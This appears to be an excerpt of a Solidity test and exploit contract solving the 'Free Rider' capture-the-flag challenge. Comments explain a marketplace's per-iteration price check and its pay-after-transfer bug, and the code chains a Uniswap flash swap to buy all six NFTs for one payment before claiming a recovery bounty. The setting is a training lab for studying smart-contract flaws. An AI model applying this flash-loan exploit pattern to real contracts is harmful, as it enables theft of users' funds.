...
contract FreeRiderChallenge is Test {
    ...
    function test_freeRider() public checkSolvedByPlayer {
        // Bugs in marketplace._buyOne:
        //   (a) price check uses msg.value per iteration, not per-NFT cumulative
        //       → one 15 ETH payment buys all 6 NFTs
        //   (b) payment sent AFTER safeTransferFrom, so new owner (= buyer)
        //       receives the price back, effectively refunding
        // We bootstrap with 15 WETH via Uniswap V2 flash swap.
        FreeRiderExploit exploit = new FreeRiderExploit(
            player, weth, uniswapPair, marketplace, nft, recoveryManager
        );
        exploit.attack{value: player.balance}();
    }
...
contract FreeRiderExploit {
    ...
    function attack() external payable {
        // Flash swap 15 WETH from Uniswap pair (token0 = WETH)
        pair.swap(15 ether, 0, address(this), abi.encode("go"));

        // Forward remaining ETH to player
    ...
    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        ...
        uint256 borrowed = amount0; // 15 ether
        // Unwrap flashed WETH to ETH
        weth.withdraw(borrowed);

        // Buy all 6 NFTs with a single 15 ETH send — bug refunds us each time
        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) ids[i] = i;
        market.buyMany{value: borrowed}(ids);

        // Send NFTs to recovery manager; encode player as bounty recipient
        for (uint256 i = 0; i < 6; i++) {
            IERC721Light(address(nft)).safeTransferFrom(
                address(this), address(recovery), i, abi.encode(player)
            );
        }

        // Repay flash swap: 15 WETH + 0.3% fee
